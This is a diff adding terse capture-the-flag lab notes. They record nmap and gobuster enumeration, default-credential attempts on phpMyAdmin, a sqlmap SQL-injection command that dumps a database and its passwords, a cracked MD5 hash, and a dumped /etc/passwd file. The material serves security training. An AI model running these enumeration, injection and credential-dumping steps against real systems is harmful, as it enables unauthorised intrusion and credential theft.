@@ -1,0 +1,260 @@
+
+# Nmap 7.95 scan initiated Thu Jul 17 05:57:02 2025 as: /usr/lib/nmap/nmap --privileged -v -sV -p- -T4 -oN nmap.txt 10.10.6.73
+Nmap scan report for 10.10.6.73
+Host is up (0.054s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE SERVICE                 VERSION
+21/tcp   open  ftp                     vsftpd 2.0.8 or later
+22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
+1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
+1883/tcp open  mosquitto version 1.6.9
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul 17 05:57:41 2025 -- 1 IP address (1 host up) scanned in 38.79 seconds
+
+
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.120.144:1337/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 321] [--> http://10.10.120.144:1337/admin/]
+/.hta                 (Status: 403) [Size: 280]
+/.htaccess            (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/index.php            (Status: 200) [Size: 91]
+/javascript           (Status: 301) [Size: 326] [--> http://10.10.120.144:1337/javascript/]
+/phpmyadmin           (Status: 301) [Size: 326] [--> http://10.10.120.144:1337/phpmyadmin/]
+/server-status        (Status: 403) [Size: 280]
+
+===============================================================
+Finished
+===============================================================
+
+
+POST /phpmyadmin/index.php HTTP/1.1
+Host: 10.10.120.144:1337
+Content-Length: 149
+Cache-Control: max-age=0
+Origin: null
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+Sec-GPC: 1
+Accept-Language: en-US,en;q=0.6
+Accept-Encoding: gzip, deflate, br
+Cookie: pma_lang=en; phpMyAdmin=go5gesugidc4shrvilla486g2i
+Connection: keep-alive
+
+set_session=go5gesugidc4shrvilla486g2i&pma_username=admin&pma_password=admin&server=1&target=index.php&lang=en&token=712f3147695638432c506e60295f3626
+
+
+
+mysqli_real_connect(): (HY000/1045): Access denied for user 'admin'@'localhost' (using password: YES)
+mysqli_real_connect(): (HY000/1045): Access denied for user 'root'@'localhost' (using password: YES)
+mysqli_real_connect(): (HY000/1045): Access denied for user 'phpmyadmin'@'localhost' (using password: YES)
+
+admin
+root
+phpmyadmin
+
+
+[200 OK] Apache[2.4.41], Content-Security-Policy[default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';,default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';], Cookies[back,goto,phpMyAdmin,pma_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpMyAdmin,pma_lang], IP[10.10.120.144], JQuery, PasswordField[pma_password], Script[text/javascript], Title[phpMyAdmin], UncommonHeaders[x-ob_mode,referrer-policy,content-security-policy,x-content-security-policy,x-webkit-csp,x-content-type-options,x-permitted-cross-domain-policies,x-robots-tag], X-Frame-Options[DENY], X-UA-Compatible[IE=Edge], X-XSS-Protection[1; mode=block], phpMyAdmin
+
+
+
+$ gobuster dir -t 100 -u http://10.10.6.73:1337/ -w /usr/share/wordlists/dirb/big.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.6.73:1337/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 315] [--> http://10.10.6.73:1337/admin/]
+/admin_101            (Status: 301) [Size: 319] [--> http://10.10.6.73:1337/admin_101/]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/javascript           (Status: 301) [Size: 320] [--> http://10.10.6.73:1337/javascript/]
+/phpmyadmin           (Status: 301) [Size: 320] [--> http://10.10.6.73:1337/phpmyadmin/]
+/server-status        (Status: 403) [Size: 277]
+Progress: 20469 / 20470 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                     
+
+Database: expose
+Table: config
+[2 entries]
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929                    |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+
+
+Retrieve HTTP request
+
+POST /admin_101/includes/user_login.php HTTP/1.1
+Host: 10.10.6.73:1337
+Content-Length: 38
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Sec-GPC: 1
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.10.6.73:1337
+Referer: http://10.10.6.73:1337/admin_101/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=5k0dokl3ec1ai53l9a055a548i
+Connection: keep-alive
+
+email=hacker%40root.thm&password=admin
+
+
+Use it qith sqldump
+
+sqlmap -r request.txt \
+-p "email" \
+--batch \
+--risk=3 --level=3 \
+--dbs --tables --columns \
+--dump
+
+
+
+
+
+[20:15:20] [INFO] table 'expose.config' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.6.73/dump/expose/config.csv'
+[20:15:20] [INFO] fetching columns for table 'user' in database 'expose'
+[20:15:20] [INFO] retrieved: 'created'
+[20:15:20] [INFO] retrieved: 'timestamp'
+[20:15:20] [INFO] retrieved: 'email'
+[20:15:20] [INFO] retrieved: 'varchar(512)'
+[20:15:21] [INFO] retrieved: 'id'
+[20:15:21] [INFO] retrieved: 'int'
+[20:15:21] [INFO] retrieved: 'password'
+[20:15:21] [INFO] retrieved: 'varchar(512)'
+[20:15:21] [INFO] fetching entries for table 'user' in database 'expose'
+[20:15:21] [INFO] retrieved: '2023-02-21 09:05:46'
+[20:15:21] [INFO] retrieved: 'hacker@root.thm'
+[20:15:21] [INFO] retrieved: '1'
+[20:15:21] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
+Database: expose
+Table: user
+[1 entry]
++----+-----------------+---------------------+--------------------------------------+
+| id | email           | created             | password                             |
++----+-----------------+---------------------+--------------------------------------+
+| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
++----+-----------------+---------------------+--------------------------------------+
+
+[20:15:21] [INFO] table 'expose.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.6.73/dump/expose/user.csv'
+[20:15:21] [WARNING] HTTP error codes detected during run:
+414 (URI Too Long) - 1 times
+[20:15:21] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.6.73'
+
+[*] ending @ 20:15:21 /2025-07-18/
+
+
+
+> 1
+[20:17:37] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[20:17:37] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[20:17:37] [INFO] starting 4 processes 
+[20:17:39] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'                         
+Database: expose                                                                                                    
+Table: config
+[2 entries]
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+
+[20:17:45] [INFO] table 'expose.config' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.6.73/dump/expose/config.csv'
+[20:17:45] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.6.73'
+
+[*] ending @ 20:17:45 /2025-07-18/
+
+
+
+
+file: /file1010111/index.php
+pass: easytohack
+
+
+Parameter Fuzzing is also important :) or Can you hide DOM elements?
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
+ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
+Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
+redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
+mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
+fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+
+
+
